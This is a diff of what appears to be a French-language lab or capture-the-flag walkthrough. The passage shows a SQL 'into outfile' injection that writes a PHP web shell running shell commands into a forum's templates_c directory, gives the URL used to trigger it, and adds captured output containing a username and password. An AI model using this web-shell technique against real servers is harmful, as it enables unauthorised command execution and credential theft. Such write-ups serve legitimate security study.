@@ -53,4 +53,4 @@ donc il nous reste plus que a l'ancer des commande systemme
 
 ```select "<?php $output = shell_exec('ls /home/laurie/'); var_dump(output); echo $output  ?>" into outfile "/var/www/forum/templates_c/te5.php"```
 puis aller sur la page 
-```https://10.12.1.150/forum/templates_c/te4.php```
+```https://10.12.1.150/forum/templates_c/te4.php``` => string(6) "output" lmezard:G!@M6f4Eatau{sF"
